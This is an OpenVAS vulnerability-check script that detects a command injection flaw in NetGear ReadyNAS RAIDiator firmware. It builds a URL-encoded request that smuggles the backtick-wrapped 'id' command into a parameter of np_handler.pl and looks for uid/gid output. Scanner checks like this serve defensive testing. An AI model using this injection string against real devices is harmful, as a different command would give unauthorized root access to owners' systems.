###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_readynas_62059.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# NetGear RAIDiator (ReadyNAS) Cross Site Request Forgery and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103822");
  script_bugtraq_id(62059);
  script_cve_id("CVE-2013-2751", "CVE-2013-2752");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11865 $");

  script_name("NetGear RAIDiator (ReadyNAS) Cross Site Request Forgery and Command Injection Vulnerabilities");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62059");
  script_xref(name:"URL", value:"http://www.netgear.com");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-10-25 15:00:37 +0200 (Fri, 25 Oct 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("apache/banner");

  script_tag(name:"impact", value:"Exploiting these issues may allow a remote attacker to perform certain
administrative actions and execute arbitrary shell commands with root
privileges. Other attacks are also possible.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to execute the 'id' command.");
  script_tag(name:"insight", value:"The NETGEAR ReadyNAS RAIDiator firmware prior to the 4.2.24
release is prone to remote command execution through the FrontView web
interface. An attacker can use an unauthenticated HTTP GET request to execute
arbitrary commands as user 'admin' on the remote NAS device. This
vulnerability exists due to a failure in /frontview/lib/np_handler.pl to
sanitize user-input. Due to various improper file system permissions, the admin
user can execute commands as root.");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"NetGear RAIDiator is prone to a cross-site request-forgery
vulnerability and a command-injection vulnerability.");
  script_tag(name:"affected", value:"Following are vulnerable:
RAIDiator versions prior to 4.1.12 running on SPARC
RAIDiator-x86 versions prior to 4.2.24");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


port = get_http_port(default:443);

banner = get_http_banner(port:port);
if("apache" >!< tolower(banner))exit(0);

host = get_host_name();
url = "/np_handler/";

if(http_vuln_check(port:port, url:url,pattern:"Empty No Support")) {

  cmd = 'id';

  foreach file (make_list("$html_payload_header","$xml_payload_header")) {

    url = '/np_handler/np_handler.pl?OPERATION=get&OUTER_TAB=tab_myshares&PAGE=User&addr=%22%29%3b' + file + '=%28%60' + cmd + '%60%29%3b%23';

    if(buf = http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+")) {
      data = 'It was possible to execute the "id" command.\n\nRequest:\n\nhttp://' + host + url + '\n\nResponse:\n\n' + buf + '\n\n';
      security_message(port:port, data:data);
      exit(0);
    }

  }

  exit(99);

}

exit(0);

